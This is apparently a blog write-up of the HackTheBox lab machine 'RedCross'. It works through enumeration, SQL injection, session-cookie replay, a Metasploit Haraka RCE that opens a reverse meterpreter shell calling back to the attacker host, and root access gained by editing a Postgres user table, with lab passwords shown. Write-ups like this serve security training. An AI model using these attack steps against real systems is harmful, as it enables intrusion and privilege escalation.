---
layout: post
title: Hackthebox RedCross Writeup
categories: HackTheBox
---

<img src="/public/images/2019-04-14/redcross_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "RedCross" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -sC -sV 10.10.10.113
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-13 19:17 EEST
Nmap scan report for intra.redcross.htb (10.10.10.113)
Host is up (0.035s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
80/tcp  open  http     Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to https://intra.redcross.htb/
443/tcp open  ssl/http Apache httpd 2.4.25
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /?page=login
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Not valid before: 2018-06-03T19:46:58
|_Not valid after:  2021-02-27T19:46:58
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.1
|   http/1.1

~~~

|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|_  http/1.1
Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4351.20 seconds
{% endhighlight %}

Since http/s access of 10.10.10.113 redirects to "https://intra.redcross.htb", we have to add following line to "/etc/hosts"
{% highlight shell %}
10.10.10.113 intra.redcross.htb
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u https://intra.redcross.htb/

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://intra.redcross.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2019/04/13 20:27:10 Starting gobuster
=====================================================
/images (Status: 301)
/pages (Status: 301)
/documentation (Status: 301)
/javascript (Status: 301)
/server-status (Status: 403)
=====================================================
2019/04/13 20:40:54 Finished
=====================================================
{% endhighlight %}

Gobuster HTTP "/documentation":
{% highlight shell %}
root@kali:~# gobuster -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u https://intra.redcross.htb/documentation/ -x .doc,.pdf

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://intra.redcross.htb/documentation/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : doc,pdf
[+] Timeout      : 10s
=====================================================
2019/04/13 21:06:57 Starting gobuster
=====================================================
/account-signup.pdf (Status: 200)
=====================================================
2019/04/13 21:47:36 Finished
=====================================================
{% endhighlight %}


### 2. Getting User
We can find a login console on the top page.
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-13-19-37-17.png)

Besides, we can find an interesting pdf under the directory "/documents"
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-13-22-03-30.png)

By sending following message, we can create a new credential "guest:guest".
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-12-26-40.png)

We can login to the console with a credential "guest:guest".
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-12-29-17.png)

If we put a single quote in a UserID and submit, we receive followin message.<br>
This means this webapp has SQLinjection vulnerability.
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-13-22-13-22.png)

In this case, the url we are redirected is following.
{% highlight shell %}
https://intra.redcross.htb/?o=%27&page=app
{% endhighlgiht %}

Now we have following query and we have to put something into single quote.
{% highlight shell %}
or dest like ''
{% endhighlight %}

We can put % there and we can achieve following output.
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-22-23-51.png)

Sounds like we have admin webapp and we have sub domain for that.<br>
Add following line in "/etc/hosts" and try to access.
{% highlight shell %}
10.10.10.113 admin.redcross.htb
{% endhighlight %}

We can find another login console.
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-12-31-43.png)

we can try the credential "guest:guest". However, it shows a message we don't have enough privilege.
Then, try to do session replay attack.<br>
Open Burp Suite and check the "PHPSESSID" in the Cookie when we accessed "intra.redcross.htb".
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-10-28-06.png)

Then, turn intercept on and try to access "admin.redcross.htb".<br>
check the value of "PHPSESSID" in the cookie and change the value to the above session id.<br>
We have to modify following 3 requests.
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-10-32-08.png)
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-10-32-37.png)
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-10-33-28.png)

Then, we can access to the admin console of "admin.redcross.htb".
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-10-36-11.png)
With accessing "User Management", we can create a new user on redcross.
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-10-45-38.png)
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-10-45-56.png)

We cam use this credential for ssh login.
{% highlight shell %}
inari:YfXHf8ta
{% endhighlight %}
{% highlight shell %}
root@kali:~# ssh inari@10.10.10.113
inari@10.10.10.113's password:  # YfXHf8ta
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid=2020 gid=1001(associates) groups=1001(associates)
{% endhighligit %}

We can confirm we're in a "jail".
{% highlight shell %}
$ cd                    
-bash: cd: /var/jail/home: No such file or directory
{% endhighlight %}

We can enumerate some directories. However, there is nothing interesting.<br>

Then, go back to admin console. We still have another page "Firewall".<br>
By providing our ip, we can put in in a "whitelist" of "firewall".
![placeholder](https://inar1.github.io/public/images/2019-04-14/2019-04-14-12-56-43.png)

Try to scan the ports again.
{% highlight shell %}
root@kali:~# nmap -p- -sC -sV 10.10.10.113
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-14 12:59 EEST
Nmap scan report for intra.redcross.htb (10.10.10.113)
Host is up (0.035s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.0.8 or later
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
80/tcp   open  http        Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to https://intra.redcross.htb/
443/tcp  open  ssl/http    Apache httpd 2.4.25
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /?page=login
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Not valid before: 2018-06-03T19:46:58
|_Not valid after:  2021-02-27T19:46:58
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.1

~~~

|   http/1.1
|_  http/1.1
1025/tcp open  NFS-or-IIS?
5432/tcp open  postgresql  PostgreSQL DB 9.6.0 or later
| fingerprint-strings:
|   SMBProgNeg:
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 1.0 to 3.0
|     Fpostmaster.c
|     L2030
|_    RProcessStartupPacket
| ssl-cert: Subject: commonName=redcross.redcross.htb
| Subject Alternative Name: DNS:redcross.redcross.htb
| Not valid before: 2018-06-03T19:13:20
|_Not valid after:  2028-05-31T19:13:20
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5432-TCP:V=7.70%I=7%D=4/14%Time=5CB304BA%P=x86_64-pc-linux-gnu%r(SM
SF:BProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fronten
SF:d\x20protocol\x2065363\.19778:\x20server\x20supports\x201\.0\x20to\x203
SF:\.0\0Fpostmaster\.c\0L2030\0RProcessStartupPacket\0\0");
Service Info: Hosts: RedCross, redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 344.69 seconds
{% endhighlight %}

We can find additional service port 1025 and port 5432.<br>
By connecting with nc and waiting for a while, port 1025 give us a response.
{% highlight shell %}
root@kali:~# nc 10.10.10.113 1025
hoge
220 redcross ESMTP Haraka 2.8.8 ready
500 Unrecognized command
{% endhighlight %}

According to Exploit database, this smtp server "Haraka 2.8.8" has RCE.
{% highlight shell %}
root@kali:~# searchsploit haraka
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
Haraka < 2.8.9 - Remote Command Execut | exploits/linux/remote/41162.py
--------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

We can use metasploit to exploit this vulnerability.
{% highlight shell %}
msf5 > use exploit/linux/smtp/haraka
msf5 exploit(linux/smtp/haraka) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf5 exploit(linux/smtp/haraka) > set srvhost 10.10.14.23
srvhost => 10.10.14.23
msf5 exploit(linux/smtp/haraka) > set srvport 8080
srvport => 8080
msf5 exploit(linux/smtp/haraka) > set email_to inari@redcross.htb
email_to => inari@redcross.htb
msf5 exploit(linux/smtp/haraka) > set email_from admin@redcross.htb
email_from => admin@redcross.htb
msf5 exploit(linux/smtp/haraka) > set rhost 10.10.10.113
rhost => 10.10.10.113
msf5 exploit(linux/smtp/haraka) > set rport 1025
rport => 1025
msf5 exploit(linux/smtp/haraka) > set lhost 10.10.14.23
lhost => 10.10.14.23
msf5 exploit(linux/smtp/haraka) > run

[*] Started reverse TCP handler on 10.10.14.23:4444 
[*] Exploiting...
[*] Using URL: http://10.10.14.23:8080/MMmePjUGN9RKWlW
[*] Sending mail to target server...
[*] Client 10.10.10.113 (Wget/1.18 (linux-gnu)) requested /MMmePjUGN9RKWlW
[*] Sending payload to 10.10.10.113 (Wget/1.18 (linux-gnu))
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.113:39132) at 2019-04-14 13:42:47 +0300
[+] Triggered bug in target server (plugin timeout)
[*] Command Stager progress - 100.00% done (119/119 bytes)
[*] Server stopped.

meterpreter > getuid
Server username: uid=1000, gid=1000, euid=1000, egid=1000
{% endhighlight %}

user.txt is in a directory "/home/penelope".
{% highlight shell %}
meterpreter > cd /home/penelope
meterpreter > ls -la
Listing: /home/penelope
=======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  0     fil   2018-06-08 13:55:13 +0300  .bash_history
100644/rw-r--r--  0     fil   2018-06-08 13:54:51 +0300  .bash_logout
100644/rw-r--r--  3380  fil   2018-06-11 01:47:31 +0300  .bashrc
100644/rw-r--r--  675   fil   2018-06-03 21:43:26 +0300  .profile
100644/rw-r--r--  24    fil   2018-06-11 01:46:30 +0300  .psqlrc
40700/rwx------   4096  dir   2018-06-09 11:51:29 +0300  .ssh
100600/rw-------  791   fil   2018-06-11 01:47:31 +0300  .viminfo
40770/rwxrwx---   4096  dir   2018-06-08 01:08:43 +0300  haraka
100640/rw-r-----  33    fil   2018-06-08 13:53:04 +0300  user.txt

meterpreter > cat user.txt
ac899bd46f7b014a369fbb60e53329bf
{% endhighlight %}

### 3. Getting Root
At first, we have to spawn a python full shell.
{% highlgiht shell %}
python -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight %}

In directory "/var/www/html/admin/pages", we can find some credentials for database.
{% highlight shell %}
penelope@redcross:/var/www/html/admin/pages$ cat actions.php
cat actions.php
<?php
session_start();
require "../init.php";

function generateRandomString($length = 8) {

~~~

	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");

~~~

	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");

~~~

?>
{% endhighlight %}

{% highlight shell %}
penelope@redcross:/var/www/html/admin/pages$ psql unix unixusrmgr -h localhost
<html/admin/pages$ psql unix unixusrmgr -h localhost
Password for user unixusrmgr: dheu%7wjx8B&

psql (9.6.7)
SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)
Type "help" for help.

unix=>
{% endhighlight %}

We can see the list of table by "\dt;"
{% highlight shell %}
unix=> \dt;
\dt;
WARNING: terminal is not fully functional
-  (press RETURN)
            List of relations
 Schema |     Name     | Type  |  Owner   
--------+--------------+-------+----------
 public | group_table  | table | postgres
 public | passwd_table | table | postgres
 public | shadow_table | table | postgres
 public | usergroups   | table | postgres
(4 rows)
{% endhighlight %}

In table "passwd_table", we can specify some parameter for remote users.
{% highlight shell %}
unix=> select * from passwd_table;
select * from passwd_table;
WARNING: terminal is not fully functional
-  (press RETURN)
 username |               passwd               | uid  | gid  | gecos |    homedi
r     |   shell   
----------+------------------------------------+------+------+-------+----------
------+-----------
 tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail
/home | /bin/bash
 inari    | $1$oJkderY0$RHUnmknSOSToS9HpHcVaP1 | 2020 | 1001 |       | /var/jail
/home | /bin/bash
(2 rows)
{% endhighlight%}

Modify the value of user inari.
{% highlight shell %}
unix=> update passwd_table set gid = 27 where uid = 2020;   
update passwd_table set gid = 27 where uid = 2020;
UPDATE 1
unix=> update passwd_table set homedir = '/root' where uid = 2020;
update passwd_table set homedir = '/root' where uid = 2020;
UPDATE 1
unix=> select * from passwd_table;
select * from passwd_table;
WARNING: terminal is not fully functional
-  (press RETURN)
 username |               passwd               | uid  | gid  | gecos |    homedi
r     |   shell   
----------+------------------------------------+------+------+-------+----------
------+-----------
 tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail
/home | /bin/bash
 inari    | $1$oJkderY0$RHUnmknSOSToS9HpHcVaP1 | 2020 |   27 |       | /root    
      | /bin/bash
(2 rows)
{% endhighlight %}

Then, login as user inari with ssh. Since group "sudo" can execute any command as root on this server, we can achieve a root shell by command "sudo -s".
{% highlight shell %}
root@kali:~# ssh inari@10.10.10.113
inari@10.10.10.113's password: 
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 14 07:31:53 2019 from 10.10.14.23
Could not chdir to home directory /root: Permission denied
-bash: /root/.bash_profile: Permission denied
inari@redcross:/$ sudo -s
[sudo] password for inari: 
root@redcross:/# cd /root
root@redcross:~# cat root.txt
892a1f4d018e5d382c4f5ee1b26717a4
{% endhighlight %}
